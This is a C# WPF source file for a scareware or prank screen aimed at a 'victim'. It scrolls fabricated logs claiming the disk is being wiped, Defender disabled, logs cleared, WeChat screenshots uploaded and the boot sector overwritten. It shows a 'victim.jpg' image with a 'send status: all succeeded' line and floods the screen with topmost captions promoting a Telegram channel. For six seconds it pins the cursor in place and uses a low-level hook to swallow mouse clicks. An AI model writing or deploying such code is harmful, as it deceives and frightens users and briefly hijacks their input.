using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Interop;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Threading;

// 音乐放完之后的收尾画面：两张圆角半透明卡片（日志输出 + 初始化完成）和一行从上方落下来的频道字样。
// 卡片没有系统标题栏，所以天然没有最小化/最大化/关闭按钮；日志是一行一行往外冒的。
internal static class VictimWindows
{
    [DllImport("user32.dll")] static extern bool SetWindowPos(IntPtr hwnd, IntPtr after, int x, int y, int w, int h, uint flags);
    const uint SWP_NOACTIVATE = 0x0010, SWP_NOZORDER = 0x0004;
    const int WS_POPUP = unchecked((int)0x80000000), WS_VISIBLE = 0x10000000;
    const int WS_EX_TOPMOST = 0x00000008, WS_EX_TOOLWINDOW = 0x00000080, WS_EX_NOACTIVATE = 0x08000000, WS_EX_LAYERED = 0x00080000;
    const uint LWA_ALPHA = 0x00000002;

    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, HookProc fn, IntPtr module, uint threadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hook);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hook, int code, IntPtr wParam, IntPtr lParam);
    delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);
    const int WH_MOUSE_LL = 14;
    static HookProc clickBlocker;
    static IntPtr clickHook;

    const string Channel = "TG官方频道@linuxnhe";

    static Thread thread;
    static volatile bool alive, stopping;
    static string imagePath;
    static readonly List<Window> windows = new List<Window>();
    static Dispatcher dispatcher;
    static DispatcherTimer ticker, floater;
    static HwndSource shield;
    static readonly List<Window> captions = new List<Window>();
    static readonly List<IntPtr> captionHwnds = new List<IntPtr>();
    static readonly List<double> captionXs = new List<double>();
    static readonly List<double> captionYs = new List<double>();
    static readonly List<double> captionSpeeds = new List<double>();
    static readonly List<double> captionPhases = new List<double>();
    static readonly List<double> captionAmps = new List<double>();
    static readonly List<double> captionBaseX = new List<double>();
    static double captionW = 320, captionH = 34, screenW, screenH;

    [StructLayout(LayoutKind.Sequential)] struct POINT { public int X, Y; }
    [DllImport("user32.dll")] static extern bool GetCursorPos(out POINT point);
    [DllImport("user32.dll")] static extern bool SetCursorPos(int x, int y);

    public static bool On { get { return alive; } }

    // 日志内容：全部按 Windows 的说法写，标签沿用 [xxx] 的格式
    static readonly string[][] Lines =
    {
        new[] { "[路径检查]", " C:\\Windows\\System32 系统盘，跳过" },
        new[] { "[路径检查]", " C:\\Windows\\WinSxS 组件存储，跳过" },
        new[] { "[路径检查]", " C:\\Program Files 已挂载，加入队列" },
        new[] { "[路径检查]", " C:\\Program Files (x86) 已挂载，加入队列" },
        new[] { "[权限提升]", " 已取得 SeDebugPrivilege，句柄 15 个" },
        new[] { "[设备枚举]", " 发现 4 个物理卷，可写 3 个" },
        new[] { "[卷影副本]", " 已删除 3 个还原点（C:\\ 卷）" },
        new[] { "[已挂载删除]", " 发现 15 个已挂载目录，启动擦除" },
        new[] { "[调用多线程擦除]", " 启动已挂载擦除，目标分区数：15" },
        new[] { "[擦除分区]", " C:\\Users 已清除 128,932 个文件" },
        new[] { "[擦除分区]", " C:\\Program Files 已清除 41,207 个文件" },
        new[] { "[擦除分区]", " D:\\ 已清除 6,884 个文件" },
        new[] { "[注册表]", " 删除 HKLM\\SOFTWARE 键值 1,204 项" },
        new[] { "[服务控制]", " 停止 Windows Update，状态：已停止" },
        new[] { "[服务控制]", " 停止 Defender 实时保护，状态：已停止" },
        new[] { "[事件日志]", " 清空 Security.evtx，条目 0 条" },
        new[] { "[还原点]", " 删除系统还原点 2 个" },
        new[] { "[回收站]", " 已清空，释放 3.41 GB" },
        new[] { "[微信文件]", " 开始批量上传截图文件，共 5 个" },
        new[] { "[上传状态]", " 5 / 5 已完成，队列为空" },
        new[] { "[缓存清理]", " Temp 目录已清空，释放 812 MB" },
        new[] { "[缓存清理]", " Prefetch 目录已清空，释放 96 MB" },
        new[] { "[擦除完成]", " 已挂载分区擦除完成，启动重启倒计时" },
        new[] { "[倒计时]", " 剩余 30 秒，请勿断电" },
        new[] { "[倒计时]", " 剩余 20 秒，正在写入引导扇区" },
        new[] { "[倒计时]", " 剩余 10 秒，重启指令已排队" },
        new[] { "[系统状态]", " 擦除均已完成清空，请欣赏 UI 动画" }
    };

    public static bool Start(string dir)
    {
        imagePath = Path.Combine(dir, "victim.jpg");
        stopping = false;
        thread = new Thread(Run);
        thread.SetApartmentState(ApartmentState.STA);
        thread.IsBackground = true;
        thread.Start();
        for (int i = 0; i < 40 && !alive; i++) Thread.Sleep(100);
        return alive;
    }

    static SolidColorBrush Rgb(byte r, byte g, byte b) { return new SolidColorBrush(Color.FromRgb(r, g, b)); }

    // 两张卡片共用的外壳：圆角、半透明深蓝底、一圈淡紫描边、上面一行小字标题
    static Border Card(double width, double height, out Grid header, out ContentControl body)
    {
        var card = new Border
        {
            CornerRadius = new CornerRadius(16),
            Background = new SolidColorBrush(Color.FromArgb(234, 10, 16, 46)),
            BorderBrush = new SolidColorBrush(Color.FromArgb(150, 96, 112, 226)),
            BorderThickness = new Thickness(1)
        };
        var grid = new Grid();
        grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(38) });
        grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });

        header = new Grid { Margin = new Thickness(18, 9, 16, 0) };
        Grid.SetRow(header, 0);

        body = new ContentControl { Margin = new Thickness(14, 0, 14, 14) };
        Grid.SetRow(body, 1);

        grid.Children.Add(header);
        grid.Children.Add(body);
        card.Child = grid;
        card.Width = width;
        card.Height = height;
        return card;
    }

    static Window MakeWindow(double width, double height)
    {
        var win = new Window
        {
            WindowStyle = WindowStyle.None,
            AllowsTransparency = true,
            Background = Brushes.Transparent,
            ResizeMode = ResizeMode.NoResize,
            ShowInTaskbar = false,
            Topmost = true,
            Width = width,
            Height = height,
            ShowActivated = false
        };
        return win;
    }

    static void Run()
    {
        try
        {
            dispatcher = Dispatcher.CurrentDispatcher;

            // ---------- 卡片一：日志输出 ----------
            Grid header1; ContentControl body1;
            var card1 = Card(640, 500, out header1, out body1);

            header1.Children.Add(new TextBlock
            {
                Text = "日志输出",
                Foreground = Rgb(142, 155, 214),
                FontFamily = new FontFamily("Consolas"),
                FontSize = 13,
                VerticalAlignment = VerticalAlignment.Center
            });
            var tag1 = new TextBlock
            {
                Text = Channel,
                Foreground = Rgb(255, 138, 42),
                FontFamily = new FontFamily("Consolas"),
                FontSize = 13,
                HorizontalAlignment = HorizontalAlignment.Right,
                VerticalAlignment = VerticalAlignment.Center
            };
            header1.Children.Add(tag1);

            var panel = new Border
            {
                CornerRadius = new CornerRadius(10),
                Background = new SolidColorBrush(Color.FromArgb(246, 6, 10, 30))
            };
            var stack = new StackPanel { Margin = new Thickness(12, 10, 12, 10) };
            var scroller = new ScrollViewer
            {
                VerticalScrollBarVisibility = ScrollBarVisibility.Visible,
                HorizontalScrollBarVisibility = ScrollBarVisibility.Disabled,
                Content = stack,
                Padding = new Thickness(0)
            };
            var dock = new DockPanel();
            var footer = new TextBlock
            {
                Text = Channel,
                Foreground = Rgb(255, 138, 42),
                FontFamily = new FontFamily("Consolas"),
                FontSize = 12,
                HorizontalAlignment = HorizontalAlignment.Right,
                Margin = new Thickness(0, 6, 8, 2)
            };
            DockPanel.SetDock(footer, Dock.Bottom);
            dock.Children.Add(footer);
            dock.Children.Add(scroller);
            panel.Child = dock;
            body1.Content = panel;

            var win1 = MakeWindow(640, 500);
            win1.Content = card1;
            win1.Left = 110;
            win1.Top = 90;
            win1.Show();
            windows.Add(win1);
            win1.MouseLeftButtonDown += delegate { try { win1.DragMove(); } catch (Exception) { } };

            // ---------- 卡片二：初始化完成 ----------
            Grid header2; ContentControl body2;
            var card2 = Card(548, 470, out header2, out body2);

            header2.Children.Add(new TextBlock
            {
                Text = Channel,
                Foreground = Rgb(255, 138, 42),
                FontFamily = new FontFamily("Consolas"),
                FontSize = 13,
                VerticalAlignment = VerticalAlignment.Center
            });

            var inner = new Border
            {
                CornerRadius = new CornerRadius(10),
                Background = new SolidColorBrush(Color.FromArgb(246, 6, 10, 30)),
                Padding = new Thickness(16, 12, 16, 14)
            };
            var vstack = new StackPanel();
            vstack.Children.Add(new TextBlock
            {
                Text = "初始化已完成！",
                Foreground = Rgb(118, 232, 122),
                FontSize = 19,
                FontWeight = FontWeights.Bold,
                Margin = new Thickness(0, 0, 0, 8)
            });
            var sendRow = new TextBlock { FontSize = 15, Margin = new Thickness(0, 0, 0, 12) };
            sendRow.Inlines.Add(new System.Windows.Documents.Run("发送状态：  ") { Foreground = Rgb(118, 232, 122) });
            sendRow.Inlines.Add(new System.Windows.Documents.Run("全部成功")
            { Foreground = Rgb(118, 232, 122), FontWeight = FontWeights.Bold });
            vstack.Children.Add(sendRow);

            var shot = LoadImage(imagePath);
            if (shot != null)
            {
                var img = new Image { Source = shot, Stretch = Stretch.Uniform, HorizontalAlignment = HorizontalAlignment.Left };
                img.Width = 497;
                img.Height = 281;
                vstack.Children.Add(img);
            }
            inner.Child = vstack;
            body2.Content = inner;

            var win2 = MakeWindow(548, 470);
            win2.Content = card2;
            win2.Left = 790;
            win2.Top = 200;
            win2.Show();
            windows.Add(win2);
            win2.MouseLeftButtonDown += delegate { try { win2.DragMove(); } catch (Exception) { } };

            // ---------- 从上方落下来的频道字样：铺满整屏，并且压在所有卡片上面 ----------
            screenW = SystemParameters.PrimaryScreenWidth;
            screenH = SystemParameters.PrimaryScreenHeight;

            captions.Clear(); captionHwnds.Clear(); captionXs.Clear(); captionYs.Clear(); captionSpeeds.Clear();

            Random seed = new Random();
            int cols = Math.Max(3, (int)(screenW / 330));
            int rows = Math.Max(4, (int)(screenH / 76));
            int total = (int)(cols * rows * 1.6);
            int made = 0;

            // 一批一批地建，别一口气卡住界面线程（否则日志要等好几秒才出来）
            var capTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(35) };
            capTimer.Tick += delegate
            {
                try
                {
                    for (int k = 0; k < 10 && made < total; k++, made++)
                    {
                        int i = made;
                        int col = i % cols, row = i / cols;
                        Window cap = MakeWindow((int)captionW, (int)captionH);
                        cap.Content = new TextBlock
                        {
                            Text = (i % 4 == 0) ? Channel : "TG频道@linuxnhe",
                            Foreground = Rgb(255, 128, 30),
                            FontSize = 17,
                            FontWeight = FontWeights.Bold,
                            FontFamily = new FontFamily("Consolas")
                        };
                        // 位置完全打散：横竖都随机，并尽量跟他人的位置错开，免得字压字看不清
                        double x = 0, y = 0;
                        for (int attempt = 0; attempt < 40; attempt++)
                        {
                            x = seed.Next(0, Math.Max(1, (int)(screenW - captionW)));
                            y = seed.Next(-(int)screenH, (int)screenH);
                            bool free = true;
                            for (int j = 0; j < captionBaseX.Count; j++)
                            {
                                if (Math.Abs(captionBaseX[j] - x) < 250 && Math.Abs(captionYs[j] - y) < 30)
                                {
                                    free = false;
                                    break;
                                }
                            }
                            if (free) break;
                        }
                        cap.Left = x;
                        cap.Top = y;
                        cap.Show();
                        windows.Add(cap);
                        captions.Add(cap);
                        captionHwnds.Add(new WindowInteropHelper(cap).Handle);
                        captionBaseX.Add(x);
                        captionXs.Add(x);
                        captionYs.Add(y);
                        captionSpeeds.Add(25 + seed.Next(0, 95));   // 25–120 像素/秒，各走各的
                        captionPhases.Add(seed.NextDouble() * 6.28);
                        captionAmps.Add(10 + seed.NextDouble() * 45);
                    }
                    if (made >= total) capTimer.Stop();
                }
                catch (Exception) { }
            };
            capTimer.Start();

            alive = true;

            // 开局 6 秒：鼠标钉在屏幕正中（每 20ms 拉回去），点击和滚轮也被钩子吞掉，
            // 键盘不受影响。6 秒一到就摘钩子、把光标放回原处。
            try
            {
                clickBlocker = delegate(int code, IntPtr msg, IntPtr data)
                {
                    if (code >= 0)
                    {
                        int m = (int)msg;
                        if (m == 0x0201 || m == 0x0202 || m == 0x0204 || m == 0x0205
                            || m == 0x0207 || m == 0x0208 || m == 0x020A)
                            return (IntPtr)1;   // 直接吞掉，不交给系统
                    }
                    return CallNextHookEx(clickHook, code, msg, data);
                };
                clickHook = SetWindowsHookEx(WH_MOUSE_LL, clickBlocker, IntPtr.Zero, 0);
            }
            catch (Exception) { }

            Thread lockThread = new Thread(delegate()
            {
                POINT saved;
                bool hasSaved = GetCursorPos(out saved);
                DateTime until = DateTime.Now.AddSeconds(6);
                while (!stopping && DateTime.Now < until)
                {
                    try { SetCursorPos((int)(screenW / 2), (int)(screenH / 2)); } catch (Exception) { }
                    Thread.Sleep(20);
                }
                if (hasSaved) { try { SetCursorPos(saved.X, saved.Y); } catch (Exception) { } }
                try
                {
                    if (clickHook != IntPtr.Zero) { UnhookWindowsHookEx(clickHook); clickHook = IntPtr.Zero; }
                }
                catch (Exception) { }
                clickBlocker = null;
            });
            lockThread.IsBackground = true;
            lockThread.Start();


            // 日志逐行冒出来
            int shown = 0;
            ticker = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(260) };
            ticker.Tick += delegate
            {
                try
                {
                    if (stack.Children.Count >= Lines.Length)
                    {
                        stack.Children.Clear();
                        shown = 0;
                    }
                    string[] pair = Lines[shown % Lines.Length];
                    var line = new TextBlock
                    {
                        FontFamily = new FontFamily("Consolas"),
                        FontSize = 13,
                        Margin = new Thickness(0, 1, 0, 1),
                        TextWrapping = TextWrapping.Wrap
                    };
                    line.Inlines.Add(new System.Windows.Documents.Run(pair[0])
                    { Foreground = Rgb(120, 170, 255) });
                    bool warn = pair[0].IndexOf("完成") >= 0 || pair[0].IndexOf("倒计时") >= 0;
                    line.Inlines.Add(new System.Windows.Documents.Run(pair[1])
                    { Foreground = warn ? Rgb(255, 116, 96) : Rgb(198, 214, 255) });
                    stack.Children.Add(line);
                    scroller.ScrollToEnd();
                    shown++;
                }
                catch (Exception) { }
            };
            ticker.Start();

            // 一大堆字幕一起往下落，落到底再从上边重来（独立线程，每 30ms 推一次位置）
            Thread captionThread = new Thread(delegate()
            {
                Random pick = new Random();
                while (!stopping)
                {
                    try
                    {
                        for (int i = 0; i < captionHwnds.Count; i++)
                        {
                            double y = captionYs[i] + captionSpeeds[i] * 0.03;
                            double phase = captionPhases[i] + 0.03 * (0.6 + i % 5 * 0.3);
                            double x = captionBaseX[i] + Math.Sin(phase) * captionAmps[i];
                            if (x < 0) x = 0;
                            if (x > screenW - captionW) x = screenW - captionW;

                            if (y > screenH + 20)
                            {
                                y = -40 - pick.Next(0, 80);
                                captionBaseX[i] = pick.Next(0, Math.Max(1, (int)(screenW - captionW)));
                                captionSpeeds[i] = 25 + pick.Next(0, 95);
                                captionAmps[i] = 10 + pick.NextDouble() * 45;
                            }
                            captionPhases[i] = phase;
                            captionYs[i] = y;
                            captionXs[i] = x;
                            SetWindowPos(captionHwnds[i], new IntPtr(-1),
                                (int)x, (int)y, (int)captionW, (int)captionH,
                                SWP_NOACTIVATE);      // 不写 NOZORDER，每帧都重新顶到最上层
                        }
                    }
                    catch (Exception) { }
                    Thread.Sleep(30);
                }
            });
            captionThread.IsBackground = true;
            captionThread.Start();

            JellyAll.Guard.HookDispatcher();
            Dispatcher.Run();
        }
        catch (Exception)
        {
            alive = false;
        }
    }

    static BitmapImage LoadImage(string path)
    {
        try
        {
            if (!File.Exists(path)) return null;
            var image = new BitmapImage();
            image.BeginInit();
            image.CacheOption = BitmapCacheOption.OnLoad;
            image.UriSource = new Uri(path);
            image.EndInit();
            image.Freeze();
            return image;
        }
        catch (Exception) { return null; }
    }

    public static void Shutdown()
    {
        stopping = true;
        alive = false;
        try
        {
            if (dispatcher != null)
                dispatcher.BeginInvoke(new Action(delegate
                {
                    try { if (clickHook != IntPtr.Zero) { UnhookWindowsHookEx(clickHook); clickHook = IntPtr.Zero; } } catch (Exception) { }
                    try { if (ticker != null) ticker.Stop(); } catch (Exception) { }
                    try { if (floater != null) floater.Stop(); } catch (Exception) { }
                    for (int i = windows.Count - 1; i >= 0; i--)
                    {
                        try { windows[i].Close(); } catch (Exception) { }
                    }
                    windows.Clear();
                    try { Dispatcher.CurrentDispatcher.InvokeShutdown(); } catch (Exception) { }
                }));
        }
        catch (Exception) { }
        if (thread != null) { thread.Join(1500); thread = null; }
    }
}
